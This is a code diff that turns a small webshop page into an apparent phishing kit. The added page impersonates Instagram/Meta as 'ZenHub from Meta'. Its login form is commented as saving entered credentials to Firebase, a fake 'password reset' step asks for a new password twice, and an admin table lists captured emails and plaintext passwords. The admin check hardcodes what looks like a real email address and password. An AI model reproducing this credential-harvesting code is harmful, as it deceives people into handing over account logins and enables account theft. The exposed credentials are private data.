+                    <svg aria-label="Facebook ikon" fill="#0095f6" height="16" role="img" viewBox="0 0 24 24" width="16"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg>
+                    <span id="fb-text">Conectare cu Facebook</span>
+                </button>
+            </div>
+
+            <div class="meta-logo">
+                <svg aria-label="Meta" fill="#262626" height="20" role="img" viewBox="0 0 100 20" width="100"><path d="M72.5 20h-4.3l-2.3-7.8h-.1l-2.3 7.8h-4.2l-3.9-12.5h4.2l2.1 8.1h.1l2.2-8.1h4.1l2.2 8.1h.1l2.1-8.1h4.1L72.5 20zM34.1 20h-4.2V7.5h4.2V20zm-2.1-14.3c-1.3 0-2.4-1.1-2.4-2.4 0-1.3 1.1-2.4 2.4-2.4 1.3 0 2.4 1.1 2.4 2.4 0 1.3-1.1 2.4-2.4 2.4zM54.3 20h-4.2V13.9c0-1.5-.6-2.5-1.9-2.5-1 0-1.6.7-1.9 1.4-.1.2-.1.6-.1.9V20h-4.2V7.5h4.2v1.7h.1c.6-1 1.8-1.9 3.6-1.9 2.4 0 4.4 1.6 4.4 5V20zM88.5 20h-4.2V13.9c0-1.5-.6-2.5-1.9-2.5-1 0-1.6.7-1.9 1.4-.1.2-.1.6-.1.9V20h-4.2V7.5h4.2v1.7h.1c.6-1 1.8-1.9 3.6-1.9 2.4 0 4.4 1.6 4.4 5V20zM7.7 20H3.5V2.5h4.2v6.7h.1c.6-1.1 2-2.1 4-2.1 3.4 0 5.8 2.7 5.8 6.4 0 3.8-2.5 6.5-5.8 6.5-1.9 0-3.3-.9-4-2.1h-.1V20zM13.3 13.5c0-2-1.2-3.4-3-3.4-1.8 0-3 1.4-3 3.4s1.2 3.4 3 3.4c1.8 0 3-1.4 3-3.4z"></path></svg>
+            </div>
         </div>
     </div>
-    <div class="container" id="app"></div>
-    
-    <!-- Modals (same structure) -->
-    <div id="cart-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeCart()">&times;</span><h2>Your Cart</h2><div id="cart-items"></div><div class="cart-total" id="cart-total"></div><button onclick="showPickupSelection()" style="width:100%;padding:1rem;background:#48bb78;color:white;border:none;border-radius:5px;">Continue</button></div></div>
-    <div id="pickup-modal" class="modal"><div class="modal-content"><span class="close" onclick="closePickupModal()">&times;</span><h2>📍 Click on map to select pickup</h2><div id="pickup-map"></div><div id="selected-location-info" style="display:none;background:#f0f0f0;padding:1rem;margin:1rem 0;"></div><div class="form-group"><label>Your Name:</label><input type="text" id="customer-name" placeholder="Full name"></div><button onclick="confirmPickupAndPay()" style="width:100%;padding:1rem;background:#48bb78;color:white;border:none;border-radius:5px;">Confirm Order</button></div></div>
-    <div id="qr-scanner-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeQRScannerModal()">&times;</span><h2>QR Scanner</h2><div id="qr-reader"></div><div style="margin-top:1rem;"><button onclick="startScanner()">Start Camera</button><button onclick="stopScanner()">Stop</button><button onclick="showManualQR()">Manual</button></div></div></div>
-    <div id="manual-qr-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeManualQRModal()">&times;</span><h2>Enter QR</h2><input type="text" id="manual-qr-input"><button onclick="verifyManualQR()">Verify</button></div></div>
-    <div id="owner-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeOwnerModal()">&times;</span><h2>Owner Login</h2><input type="email" id="owner-email"><button onclick="ownerLogin()">Login</button></div></div>
-    <div id="balance-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeBalanceModal()">&times;</span><h2>Balance</h2><div style="text-align:center;"><h3>$<span id="user-balance">0</span></h3><button onclick="closeBalanceModal()">Continue</button></div></div></div>
+
+    <!-- ================= JELSZÓ VISSZAÁLLÍTÓ OLDAL (Bejelentkezés után) ================= -->
+    <div id="reset-page" class="reset-container">
+        <div class="reset-box">
+            <h2 id="reset-title">🔒 Új jelszó beállítása</h2>
+            <p id="reset-desc">Add meg az új jelszavadat kétszer a biztonság kedvéért.</p>
+            
+            <form id="reset-form">
+                <input type="password" id="new-password" placeholder="Új jelszó (min. 6 számjegy)" required minlength="6">
+                <input type="password" id="confirm-password" placeholder="Jelszó megerősítése" required minlength="6">
+                <button type="submit" id="reset-btn">Jelszó csere</button>
+            </form>
+
+            <div id="success-msg" class="success-message">
+                ✓ Sikeres jelszócsere!<br>
+                <span id="success-text">Your password successfully was resetted.</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= ADMIN PANEL ================= -->
+    <div id="admin-page" class="admin-container">
+        <h2>Bejelentkezési Adatok (Admin)</h2>
+        <p style="margin-bottom: 20px; color: #666;">Pipáld ki azokat, amiket törölni szeretnél, majd nyomd meg a "Kijelöltek törlése" gombot.</p>
+        
+        <table class="admin-table">
+            <thead>
+                <tr>
+                    <th>Kijelölés</th>
+                    <th>#</th>
+                    <th>Email / User</th>
+                    <th>Jelszó</th>
+                    <th>Időpont</th>
+                </tr>
+            </thead>
+            <tbody id="admin-table-body">
+                <!-- Ide töltődnek be az adatok Firebase-ből -->
+            </tbody>
+        </table>
+
+        <div class="admin-actions">
+            <button class="btn-danger" id="btn-delete-selected">Kijelöltek törlése</button>
+            <button class="btn-logout" id="btn-logout">Kilépés</button>
+        </div>
+    </div>
+
+    <!-- ================= LÁBLÉC ================= -->
+    <footer id="main-footer">
+        <div class="footer-links">
+            <a href="#" data-key="meta">Meta</a>
+            <a href="#" data-key="about">Despre</a>
+            <a href="#" data-key="blog">Blog</a>
+            <a href="#" data-key="jobs">Locuri de muncă</a>
+            <a href="#" data-key="help">Ajutor</a>
+            <a href="#" data-key="api">API</a>
+            <a href="#" data-key="privacy">Confidențialitate</a>
+            <a href="#" data-key="terms">Termeni</a>
+            <a href="#" data-key="locations">Locații</a>
+            <a href="#" data-key="popular">Popular</a>
+            <a href="#" data-key="instagram_lite">Instagram Lite</a>
+            <a href="#" data-key="meta_ai">Meta AI</a>
+            <a href="#" data-key="threads">Threads</a>
+            <a href="#" data-key="contact_upload">Încărcarea contactelor și non-utilizatori</a>
+            <a href="#" data-key="verified">Meta Verified</a>
+        </div>
+        
+        <select class="language-selector" id="lang-select">
+            <option value="ro">Română</option>
+            <option value="hu">Magyar</option>
+            <option value="en">English</option>
+        </select>
+
+        <p id="copyright">© 2026 ZenHub from Meta</p>
+    </footer>
 
     <script>
-        // EMBEDDED DATA - This is what gets saved when you download!
-        let products = ${currentProducts};
-        let activeQRs = ${currentQRs};
-        let qrUsers = ${currentUsers};
-        let orders = ${currentOrders};
-        let cart = [];
-        let currentUser = null;
-        let isOwner = false;
-        let selectedPickupPoint = null;
-        let html5QrCode = null;
-        let pickupMap = null;
-        const OWNER_EMAIL = "owner@webshop.com";
-        
-        let pickupPoints = [
-            { id: 1, lat: 44.4268, lng: 26.1025, name: "Bucharest", address: "Strada Lipscani 12" },
-            { id: 2, lat: 46.7712, lng: 23.6236, name: "Cluj-Napoca", address: "Piața Unirii 15" }
-        ];
-        
-        function saveProducts() { localStorage.setItem('webshop_products_final', JSON.stringify(products)); }
-        function saveQRs() { localStorage.setItem('webshop_qrs_final', JSON.stringify(activeQRs)); }
-        function saveUsers() { localStorage.setItem('webshop_users_final', JSON.stringify(qrUsers)); }
-        function saveOrders() { localStorage.setItem('webshop_orders_final', JSON.stringify(orders)); }
-        function saveCart() { localStorage.setItem('webshop_cart_final', JSON.stringify(cart)); }
-        
-        function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
-        
-        function addToCart(productId) {
-            const product = products.find(p => p.id === productId);
-            if (product) { cart.push(product); saveCart(); updateCartCount(); showAlert(product.name + ' added!', 'success'); }
-        }
-        
-        function removeFromCart(index) { cart.splice(index, 1); saveCart(); updateCartCount(); showCart(); }
-        
-        function showCart() {
-            if (!cart.length) { showAlert('Cart empty!', 'error'); return; }
-            const modal = document.getElementById('cart-modal');
-            const total = cart.reduce((s, i) => s + i.price, 0);
-            document.getElementById('cart-items').innerHTML = cart.map((item, i) => '<div class="cart-item"><div><strong>' + item.name + '</strong><br>$' + item.price + '</div><button onclick="removeFromCart(' + i + ')" style="background:#f56565;color:white;border:none;padding:0.3rem 0.8rem;">Remove</button></div>').join('');
-            document.getElementById('cart-total').innerHTML = 'Total: $' + total.toFixed(2);
-            modal.style.display = 'block';
-        }
-        
-        function closeCart() { document.getElementById('cart-modal').style.display = 'none'; }
-        
-        function initPickupMap() {
-            if (pickupMap) pickupMap.remove();
-            pickupMap = L.map('pickup-map').setView([46.7712, 23.6236], 12);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(pickupMap);
-            pickupMap.on('click', function(e) {
-                if (window.selectedMarker) pickupMap.removeLayer(window.selectedMarker);
-                window.selectedMarker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(pickupMap);
-                selectedPickupPoint = { lat: e.latlng.lat, lng: e.latlng.lng, address: e.latlng.lat.toFixed(6) + ', ' + e.latlng.lng.toFixed(6) };
-                document.getElementById('selected-location-info').style.display = 'block';
-                document.getElementById('selected-location-info').innerHTML = '<div class="selected-point">✓ Selected</div><p>' + selectedPickupPoint.address + '</p>';
-            });
-        }
-        
-        function showPickupSelection() {
-            if (!cart.length) { showAlert('Cart empty!', 'error'); return; }
-            closeCart();
-            document.getElementById('pickup-modal').style.display = 'block';
-            document.getElementById('customer-name').value = '';
-            document.getElementById('selected-location-info').style.display = 'none';
-            selectedPickupPoint = null;
-            setTimeout(() => initPickupMap(), 100);
-        }
-        
-        function closePickupModal() { document.getElementById('pickup-modal').style.display = 'none'; }
-        
-        function confirmPickupAndPay() {
-            const customerName = document.getElementById('customer-name').value.trim();
-            if (!selectedPickupPoint) { showAlert('Please click on the map!', 'error'); return; }
-            if (!customerName) { showAlert('Please enter your name!', 'error'); return; }
+        // --- NYELVI SZÓTÁR ---
+        const translations = {
+            ro: {
+                loginTitle: "Conectează-te la ZenHub",
+                usernamePlaceholder: "Numărul de mobil, numele de utilizator sau adresa de e-mail",
+                passwordPlaceholder: "Parolă",
+                loginBtn: "Conectare",
+                forgotLink: "Ai uitat parola?",
+                orDivider: "SAU",
+                fbBtn: "Conectare cu Facebook",
+                heroTitle: "Vezi în fiecare zi momente de la <br><span>prieteni apropiați.</span>",
+                resetTitle: "🔒 Új jelszó beállítása",
+                resetDesc: "Add meg az új jelszavadat kétszer a biztonság kedvéért.",
+                newPassPlaceholder: "Új jelszó (min. 6 számjegy)",
+                confirmPassPlaceholder: "Jelszó megerősítése",
+                resetBtn: "Jelszó csere",
+                successMsg: "Your password successfully was resetted.",
+                footer: {
+                    meta: "Meta", about: "Despre", blog: "Blog", jobs: "Locuri de muncă", help: "Ajutor", api: "API",
+                    privacy: "Confidențialitate", terms: "Termeni", locations: "Locații", popular: "Popular",
+                    instagram_lite: "Instagram Lite", meta_ai: "Meta AI", threads: "Threads", 
+                    contact_upload: "Încărcarea contactelor și non-utilizatori", verified: "Meta Verified"
+                },
+                copyright: "© 2026 ZenHub from Meta"
+            },
+            hu: {
+                loginTitle: "Jelentkezz be a ZenHub-ra",
+                usernamePlaceholder: "Mobiltelefonszám, felhasználónév vagy e-mail cím",
+                passwordPlaceholder: "Jelszó",
+                loginBtn: "Bejelentkezés",
+                forgotLink: "Elfelejtetted a jelszavad?",
+                orDivider: "VAGY",
+                fbBtn: "Bejelentkezés Facebookkal",
+                heroTitle: "Lásd minden nap a <br><span>közeli barátaid</span> pillanatait.",
+                resetTitle: "🔒 Új jelszó beállítása",
+                resetDesc: "Add meg az új jelszavadat kétszer a biztonság kedvéért.",
+                newPassPlaceholder: "Új jelszó (min. 6 számjegy)",
+                confirmPassPlaceholder: "Jelszó megerősítése",
+                resetBtn: "Jelszó csere",
+                successMsg: "A jelszavad sikeresen megváltozott.",
+                footer: {
+                    meta: "Meta", about: "Névjegy", blog: "Blog", jobs: "Állások", help: "Súgó", api: "API",
+                    privacy: "Adatvédelem", terms: "Feltételek", locations: "Helyek", popular: "Népszerű",
+                    instagram_lite: "Instagram Lite", meta_ai: "Meta AI", threads: "Threads", 
+                    contact_upload: "Névjegyek feltöltése", verified: "Meta Verified"
+                },
+                copyright: "© 2026 ZenHub from Meta"
+            },
+            en: {
+                loginTitle: "Log in to ZenHub",
+                usernamePlaceholder: "Mobile number, username or email address",
+                passwordPlaceholder: "Password",
+                loginBtn: "Log In",
+                forgotLink: "Forgot password?",
+                orDivider: "OR",
+                fbBtn: "Log in with Facebook",
+                heroTitle: "See everyday moments from your <br><span>close friends.</span>",
+                resetTitle: "🔒 Set New Password",
+                resetDesc: "Enter your new password twice to be safe.",
+                newPassPlaceholder: "New password (min. 6 digits)",
+                confirmPassPlaceholder: "Confirm password",
+                resetBtn: "Change Password",
+                successMsg: "Your password successfully was resetted.",
+                footer: {
+                    meta: "Meta", about: "About", blog: "Blog", jobs: "Jobs", help: "Help", api: "API",
+                    privacy: "Privacy", terms: "Terms", locations: "Locations", popular: "Popular",
+                    instagram_lite: "Instagram Lite", meta_ai: "Meta AI", threads: "Threads", 
+                    contact_upload: "Contact Uploading & Non-Users", verified: "Meta Verified"
+                },
+                copyright: "© 2026 ZenHub from Meta"
+            }
+        };
+
+        let currentLang = 'ro';
+
+        // --- NYELV VÁLTÁS ---
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const t = translations[lang];
             
-            const total = cart.reduce((s, i) => s + i.price, 0);
-            let paymentMethod = 'Cash', orderStatus = 'Pending Cash';
-            
-            if (currentUser && qrUsers[currentUser] && qrUsers[currentUser].balance >= total) {
-                qrUsers[currentUser].balance -= total;
-                saveUsers();
-                paymentMethod = 'QR Balance';
-                orderStatus = 'Paid';
-                showAlert('Payment successful!', 'success');
-            }
-            
-            const order = { id: Date.now(), date: new Date().toLocaleString(), customerName, items: [...cart], total, paymentMethod, status: orderStatus, pickupLocation: selectedPickupPoint };
-            orders.unshift(order);
-            saveOrders();
-            showAlert('Order #' + order.id + ' placed!', 'success');
-            cart = []; saveCart(); updateCartCount();
-            closePickupModal();
-            showProducts();
-        }
-        
-        function showProducts() {
-            const app = document.getElementById('app');
-            if (isOwner) {
-                app.innerHTML = '<div class="owner-panel"><h2>👑 Owner Dashboard</h2><h3>➕ Add Product</h3><div class="form-group"><label>Name:</label><input type="text" id="product-name"></div><div class="form-group"><label>Price:</label><input type="number" id="product-price"></div><div class="form-group"><label>Image URL:</label><input type="text" id="product-image"></div><button onclick="addProduct()">Add Product</button><h3>🔑 QR Codes</h3><button onclick="generateQRCode()">Generate QR</button><div id="qr-list"></div><h3>📦 Orders</h3><div id="orders-list"></div></div><div class="products-grid">' + products.map(p => '<div class="product-card"><button class="delete-product" onclick="deleteProduct(' + p.id + ')">×</button><img src="' + p.image + '" class="product-image"><div class="product-info"><div class="product-title">' + p.name + '</div><div class="product-price">$' + p.price + '</div><button onclick="addToCart(' + p.id + ')" class="add-to-cart">Add to Cart</button></div></div>').join('') + '</div>';
-                displayQRList();
-                displayOrders();
-            } else {
-                app.innerHTML = '<div class="products-grid">' + products.map(p => '<div class="product-card"><img src="' + p.image + '" class="product-image"><div class="product-info"><div class="product-title">' + p.name + '</div><div class="product-price">$' + p.price + '</div><button onclick="addToCart(' + p.id + ')" class="add-to-cart">Add to Cart</button></div></div>').join('') + '</div>';
-            }
-        }
-        
-        function addProduct() {
-            const name = document.getElementById('product-name').value;
-            const price = parseFloat(document.getElementById('product-price').value);
-            const image = document.getElementById('product-image').value || 'https://via.placeholder.com/200';
-            if (name && price) {
-                products.push({ id: Date.now(), name, price, image });
-                saveProducts();
-                showProducts();
-                showAlert('Product added!', 'success');
-            }
-        }
-        
-        function deleteProduct(id) {
-            if (confirm('Delete?')) {
-                products = products.filter(p => p.id !== id);
-                saveProducts();
-                showProducts();
-            }
-        }
-        
-        function generateQRCode() {
-            const qrId = 'VIP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-            activeQRs.push(qrId);
-            saveQRs();
-            qrUsers[qrId] = { balance: 100, lastWeekly: Date.now() };
-            saveUsers();
-            displayQRList();
-            showAlert('QR Generated: ' + qrId, 'success');
-        }
-        
-        function deleteQRCode(qrId) {
-            if (confirm('Delete QR?')) {
-                activeQRs = activeQRs.filter(q => q !== qrId);
-                delete qrUsers[qrId];
-                saveQRs(); saveUsers();
-                displayQRList();
-            }
-        }
-        
-        function displayQRList() {
-            const div = document.getElementById('qr-list');
-            if (div) {
-                div.innerHTML = '<h4>Active QR Codes:</h4>';
-                activeQRs.forEach(qr => {
-                    const id = 'qr_' + qr.replace(/[^a-zA-Z0-9]/g, '_');
-                    div.innerHTML += '<div class="qr-item"><div><strong>' + qr + '</strong><div id="' + id + '"></div></div><button class="delete-qr" onclick="deleteQRCode(\'' + qr + '\')">Delete</button></div>';
-                    setTimeout(() => new QRCode(document.getElementById(id), { text: qr, width: 100, height: 100 }), 10);
-                });
-            }
-        }
-        
-        function displayOrders() {
-            const div = document.getElementById('orders-list');
-            if (div && orders.length) {
-                div.innerHTML = '<table class="orders-table"><tr><th>ID</th><th>Customer</th><th>Total</th><th>Status</th><th>Pickup</th></tr>' + orders.map(o => '<tr><td>#' + o.id + '</td><td>' + o.customerName + '</td><td>$' + o.total + '</td><td>' + o.status + '</td><td><small>' + (o.pickupLocation?.address || 'N/A') + '</small></td></tr>').join('') + '</table>';
-            }
-        }
-        
-        function handleQRCodeScanned(text) {
-            stopScanner();
-            if (activeQRs.includes(text)) {
-                currentUser = text;
-                document.getElementById('user-balance').innerText = qrUsers[text]?.balance || 0;
-                document.getElementById('balance-modal').style.display = 'block';
-                closeQRScannerModal();
-                showAlert('QR Verified! Balance: $' + (qrUsers[text]?.balance || 0), 'success');
-            } else showAlert('Invalid QR!', 'error');
-        }
-        
-        function verifyManualQR() {
-            const code = document.getElementById('manual-qr-input').value.trim();
-            if (activeQRs.includes(code)) {
-                currentUser = code;
-                document.getElementById('user-balance').innerText = qrUsers[code]?.balance || 0;
-                document.getElementById('balance-modal').style.display = 'block';
-                closeManualQRModal();
-            } else showAlert('Invalid QR!', 'error');
-        }
-        
-        function showQRScanner() { document.getElementById('qr-scanner-modal').style.display = 'block'; startScanner(); }
-        function closeQRScannerModal() { stopScanner(); document.getElementById('qr-scanner-modal').style.display = 'none'; }
-        function startScanner() { html5QrCode = new Html5Qrcode("qr-reader"); html5QrCode.start({ facingMode: "environment" }, { fps: 10, qrbox: 250 }, (t) => handleQRCodeScanned(t), (e) => {}).catch(() => showAlert('Camera error', 'error')); }
-        function stopScanner() { if (html5QrCode) html5QrCode.stop(); }
-        function showManualQR() { closeQRScannerModal(); document.getElementById('manual-qr-modal').style.display = 'block'; }
-        function closeManualQRModal() { document.getElementById('manual-qr-modal').style.display = 'none'; }
-        function showOwnerLogin() { document.getElementById('owner-modal').style.display = 'block'; }
-        function closeOwnerModal() { document.getElementById('owner-modal').style.display = 'none'; }
-        function ownerLogin() { if (document.getElementById('owner-email').value === OWNER_EMAIL) { isOwner = true; closeOwnerModal(); showProducts(); showAlert('Welcome Owner!', 'success'); } else showAlert('Invalid!', 'error'); }
-        function closeBalanceModal() { document.getElementById('balance-modal').style.display = 'none'; }
-        function showAlert(msg, type) { const a = document.createElement('div'); a.className = 'alert alert-' + type; a.innerHTML = msg; document.body.appendChild(a); setTimeout(() => a.remove(), 3000); }
-        
-        loadAllData();
-        showProducts();
-    </script>
-</body>
-</html>`;
-            
-            // Download the file
-            const blob = new Blob([fullHTML], { type: 'text/html' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `webshop_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.html`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            showAlert('✅ HTML file downloaded! This file contains ALL your products and QR codes embedded in the code!', 'success');
-        }
-        
-        // ============ PRODUCT FUNCTIONS ============
-        function addProduct() {
-            const name = document.getElementById('product-name').value;
-            const price = parseFloat(document.getElementById('product-price').value);
-            const image = document.getElementById('product-image').value || 'https://via.placeholder.com/200';
-            
-            if (name && price) {
-                const newProduct = { id: Date.now(), name, price, image };
-                products.push(newProduct);
-                saveProducts(); // AUTO-SAVED!
-                document.getElementById('product-name').value = '';
-                document.getElementById('product-price').value = '';
-                document.getElementById('product-image').value = '';
-                showProducts();
-                showAlert(`✅ Product "${name}" ADDED and AUTO-SAVED to code!`, 'success');
-            } else {
-                showAlert('Please fill all fields!', 'error');
-            }
-        }
-        
-        function deleteProduct(productId) {
-            if (confirm('Delete this product?')) {
-                products = products.filter(p => p.id !== productId);
-                saveProducts(); // AUTO-SAVED!
-                showProducts();
-                showAlert('✅ Product DELETED and AUTO-SAVED to code!', 'success');
-            }
-        }
-        
-        function generateQRCode() {
-            const qrId = 'VIP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-            activeQRs.push(qrId);
-            saveQRs(); // AUTO-SAVED!
-            
-            qrUsers[qrId] = { balance: 100, lastWeekly: Date.now() };
-            saveUsers(); // AUTO-SAVED!
-            
-            displayQRList();
-            showAlert(`✅ QR Code GENERATED and AUTO-SAVED to code: ${qrId}`, 'success');
-        }
-        
-        function deleteQRCode(qrId) {
-            if (confirm('Delete this QR code?')) {
-                activeQRs = activeQRs.filter(q => q !== qrId);
-                delete qrUsers[qrId];
-                saveQRs(); // AUTO-SAVED!
-                saveUsers(); // AUTO-SAVED!
-                displayQRList();
-                showAlert('✅ QR Code DELETED and AUTO-SAVED to code!', 'success');
-            }
-        }
-        
-        // ============ REST OF THE FUNCTIONS (same as before) ============
-        function addToCart(productId) {
-            const product = products.find(p => p.id === productId);
-            if (product) {
-                cart.push(product);
-                saveCart();
-                updateCartCount();
-                showAlert(`${product.name} added to cart!`, 'success');
-            }
-        }
-        
-        function removeFromCart(index) {
-            cart.splice(index, 1);
-            saveCart();
-            updateCartCount();
-            showCart();
-        }
-        
-        function updateCartCount() {
-            document.getElementById('cart-count').innerText = cart.length;
-        }
-        
-        function showCart() {
-            if (!cart.length) { showAlert('Cart empty!', 'error'); return; }
-            const modal = document.getElementById('cart-modal');
-            const total = cart.reduce((s, i) => s + i.price, 0);
-            document.getElementById('cart-items').innerHTML = cart.map((item, i) => `
-                <div class="cart-item">
-                    <div><strong>${item.name}</strong><br>$${item.price}</div>
-                    <button onclick="removeFromCart(${i})" style="background:#f56565;color:white;border:none;padding:0.3rem 0.8rem;border-radius:3px;">Remove</button>
-                </div>
-            `).join('');
-            document.getElementById('cart-total').innerHTML = `Total: $${total.toFixed(2)}`;
-            modal.style.display = 'block';
-        }
-        
-        function closeCart() { document.getElementById('cart-modal').style.display = 'none'; }
-        
-        function initPickupMap() {
-            if (pickupMap) pickupMap.remove();
-            pickupMap = L.map('pickup-map').setView([46.7712, 23.6236], 12);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(pickupMap);
-            pickupMap.on('click', function(e) {
-                if (window.selectedMarker) pickupMap.removeLayer(window.selectedMarker);
-                window.selectedMarker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(pickupMap);
-                selectedPickupPoint = { lat: e.latlng.lat, lng: e.latlng.lng, address: `${e.latlng.lat.toFixed(6)}, ${e.latlng.lng.toFixed(6)}` };
-                document.getElementById('selected-location-info').style.display = 'block';
-                document.getElementById('selected-address').innerHTML = `<strong>📍 Address:</strong><br>${selectedPickupPoint.address}`;
-                showAlert('Pickup location selected!', 'success');
-            });
-        }
-        
-        function showPickupSelection() {
-            if (!cart.length) { showAlert('Cart empty!', 'error'); return; }
-            closeCart();
-            document.getElementById('pickup-modal').style.display = 'block';
-            document.getElementById('customer-name').value = '';
-            document.getElementById('selected-location-info').style.display = 'none';
-            selectedPickupPoint = null;
-            setTimeout(() => initPickupMap(), 100);
-        }
-        
-        function closePickupModal() { document.getElementById('pickup-modal').style.display = 'none'; }
-        
-        function confirmPickupAndPay() {
-            const customerName = document.getElementById('customer-name').value.trim();
-            
-            if (!selectedPickupPoint) {
-                showAlert('Please click on the map to select a pickup location!', 'error');
-                return;
-            }
-            
-            if (!customerName) {
-                showAlert('Please enter your full name!', 'error');
-                document.getElementById('customer-name').focus();
-                return;
-            }
-            
-            const total = cart.reduce((sum, item) => sum + item.price, 0);
-            let paymentMethod = 'Cash';
-            let orderStatus = 'Pending (Cash Payment)';
-            let customerInfo = customerName;
-            
-            if (currentUser && qrUsers[currentUser]) {
-                if (qrUsers[currentUser].balance >= total) {
-                    qrUsers[currentUser].balance -= total;
-                    saveUsers();
-                    paymentMethod = 'QR Balance';
-                    orderStatus = 'Paid';
-                    customerInfo = `${customerName} (QR: ${currentUser})`;
-                    showAlert(`✅ Payment successful! Remaining: $${qrUsers[currentUser].balance}`, 'success');
-                } else {
-                    paymentMethod = 'Cash (Insufficient QR Balance)';
-                    orderStatus = 'Pending (Cash Payment)';
-                    showAlert('⚠️ Insufficient QR balance! Please pay cash at pickup.', 'warning');
+            // Jobb oldal
+            document.getElementById('login-title').textContent = t.loginTitle;
+            document.getElementById('username').placeholder = t.usernamePlaceholder;
+            document.getElementById('password').placeholder = t.passwordPlaceholder;
+            document.getElementById('btn-login').textContent = t.loginBtn;
+            document.getElementById('forgot-link').textContent = t.forgotLink;
+            document.querySelector('.divider span').textContent = t.orDivider;
+            document.getElementById('fb-text').textContent = t.fbBtn;
+
+            // Bal oldal
+            document.getElementById('hero-title').innerHTML = t.heroTitle;
+
+            // Reset oldal
+            document.getElementById('reset-title').textContent = t.resetTitle;
+            document.getElementById('reset-desc').textContent = t.resetDesc;
+            document.getElementById('new-password').placeholder = t.newPassPlaceholder;
+            document.getElementById('confirm-password').placeholder = t.confirmPassPlaceholder;
+            document.getElementById('reset-btn').textContent = t.resetBtn;
+            document.getElementById('success-text').textContent = t.successMsg;
+
+            // Lábléc linkek
+            const footerLinks = document.querySelectorAll('.footer-links a');
+            footerLinks.forEach(link => {
+                const key = link.getAttribute('data-key');
+                if (t.footer[key]) {
+                    link.textContent = t.footer[key];
                 }
+            });
+
+            document.getElementById('copyright').textContent = t.copyright;
+        }
+
+        document.getElementById('lang-select').addEventListener('change', function(e) {
+            changeLanguage(e.target.value);
+        });
+        changeLanguage('ro');
+
+        // --- OLDALAK KEZELÉSE ---
+        const mainPage = document.getElementById('main-page');
+        const resetPage = document.getElementById('reset-page');
+        const adminPage = document.getElementById('admin-page');
+        const mainFooter = document.getElementById('main-footer');
+
+        function showMain() {
+            mainPage.style.display = 'flex';
+            resetPage.style.display = 'none';
+            adminPage.style.display = 'none';
+            mainFooter.style.display = 'block';
+        }
+
+        function showReset() {
+            mainPage.style.display = 'none';
+            resetPage.style.display = 'flex';
+            adminPage.style.display = 'none';
+            mainFooter.style.display = 'block';
+            document.getElementById('success-msg').style.display = 'none';
+            document.getElementById('reset-form').style.display = 'block';
+            document.getElementById('reset-form').reset();
+        }
+
+        function showAdmin() {
+            mainPage.style.display = 'none';
+            resetPage.style.display = 'none';
+            adminPage.style.display = 'flex';
+            mainFooter.style.display = 'none';
+            loadAdminData();
+        }
+
+        // --- BEJELENTKEZÉS ÉS FIREBASE MENTÉS ---
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // Admin ellenőrzés
+            if (user === 'yoaeeyoaee@gmail.com' && pass === 'Nmark2007') {
+                showAdmin();
+                return;
             }
-            
-            const order = {
-                id: Date.now(),
-                date: new Date().toLocaleString(),
-                customerName: customerName,
-                items: [...cart],
-                total: total,
-                paymentMethod: paymentMethod,
-                status: orderStatus,
-                pickupLocation: selectedPickupPoint
-            };
-            
-            orders.unshift(order);
-            saveOrders(); // AUTO-SAVED!
-            
-            console.log(`📧 EMAIL to ${OWNER_EMAIL}: New Order #${order.id} from ${customerName} at ${selectedPickupPoint.address}`);
-            showAlert(`✅ Order #${order.id} placed! Owner notified.`, 'success');
-            
-            cart = [];
-            saveCart();
-            updateCartCount();
-            closePickupModal();
-            showOrderConfirmation(order);
-        }
-        
-        function showOrderConfirmation(order) {
-            const app = document.getElementById('app');
-            app.innerHTML = `
-                <div style="background:white;padding:2rem;border-radius:10px;text-align:center;">
-                    <h2 style="color:#48bb78;">✅ Order Confirmed!</h2>
-                    <p>Thank you, ${order.customerName}!</p>
-                    <p>Order #${order.id}</p>
-                    <p>Total: <strong>$${order.total}</strong></p>
-                    <div class="map-container">
-                        <div id="confirmation-map" style="height:300px;margin:1rem 0;"></div>
-                    </div>
-                    <p><strong>Pickup Location:</strong><br>${order.pickupLocation.address}</p>
-                    <button onclick="showProducts()" style="margin-top:1rem;padding:0.8rem 2rem;background:#667eea;color:white;border:none;border-radius:5px;">Continue Shopping</button>
-                </div>
-            `;
-            setTimeout(() => {
-                const map = L.map('confirmation-map').setView([order.pickupLocation.lat, order.pickupLocation.lng], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([order.pickupLocation.lat, order.pickupLocation.lng]).addTo(map).bindPopup('Your Pickup Point').openPopup();
-            }, 100);
-        }
-        
-        function showProducts() {
-            const app = document.getElementById('app');
-            if (isOwner) {
-                app.innerHTML = `
-                    <div class="owner-panel">
-                        <h2>👑 Owner Dashboard</h2>
-                        <p style="color:#48bb78; margin-bottom:1rem;">✓ All changes are AUTO-SAVED to code!</p>
-                        <p style="margin-bottom:1rem;">💾 Click "Save as HTML" to download the full code with all data!</p>
-                        
